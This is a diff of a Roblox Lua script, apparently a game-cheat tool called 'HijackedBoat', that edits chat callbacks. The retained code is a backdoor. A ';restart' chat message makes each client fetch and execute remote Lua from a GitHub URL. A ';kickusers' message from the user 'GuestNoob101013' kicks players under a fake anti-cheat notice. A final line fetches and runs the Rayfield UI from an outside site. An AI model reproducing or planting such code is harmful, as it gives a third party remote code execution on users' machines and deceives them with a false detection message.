@@ -2,7 +2,6 @@ local TextChatService = game:GetService("TextChatService")
 local Players = game:GetService("Players")
 local localPlayer = Players.LocalPlayer
 
--- Assign a function directly to the callback
 TextChatService.OnIncomingMessage = function(message)
     if message.Text == ";restart" then
         local sender = message.TextSource
@@ -10,22 +9,25 @@ TextChatService.OnIncomingMessage = function(message)
             loadstring(game:HttpGet("https://raw.githubusercontent.com/WasiTC/HijackedBoat/refs/heads/main/HijackedBoat.lua"))()
         end
     end
-    return message -- Return the message object (required by TextChatService)
+
+    -- Return the message's properties to comply with the API requirements
+    return message:GetProperties()
 end
 
 local TextChatService = game:GetService("TextChatService")
 local Players = game:GetService("Players")
 local localPlayer = Players.LocalPlayer
 
--- Assign a function directly to the callback
 TextChatService.OnIncomingMessage = function(message)
     if message.Text == ";kickusers" then
         local sender = message.TextSource
         if sender and sender:IsA("Player") and sender.Name == "GuestNoob101013" then
-            localPlayer:Kick("Anti-Cheat: You have been kicked from the game for exploiting. | Cheat Detected: HijackedBoat")
+            localPlayer:Kick("Anti-Cheat: You have been kicked for exploiting. | Cheat Detected: HijackedBoat")
         end
     end
-    return message -- Return the message object (required by TextChatService)
+
+    -- Return the message's properties to comply with the API requirements
+    return message:GetProperties()
 end
 
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
